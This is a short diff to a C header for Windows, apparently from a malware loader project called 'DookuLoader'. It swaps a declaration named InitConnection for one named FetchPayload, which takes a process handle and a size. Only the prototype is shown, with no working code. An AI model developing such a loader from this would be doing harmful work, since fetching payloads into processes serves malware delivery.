@@ -7,6 +7,6 @@
 
 #include <windows.h>
 
-BOOL InitConnection(IN HANDLE hProcess, IN OUT LPVOID lpBuffer); // Add Size once working
+PVOID FetchPayload(IN HANDLE hProcess, IN OUT PSIZE_T psSize); // Add Size once working
 
 #endif //DOOKULOADER_HTTP_H
